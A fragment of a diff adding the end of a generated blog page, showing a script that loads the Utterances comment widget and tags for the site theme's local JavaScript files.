+  s.setAttribute('async', '');
+  if (false) {
+    s.setAttribute('data-pjax-rm', '');
+  }
+  container.append(s);
+}
+
+if (false) {
+  loadUtterances();
+} else {
+  window.addEventListener('DOMContentLoaded', loadUtterances, false);
+}</script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
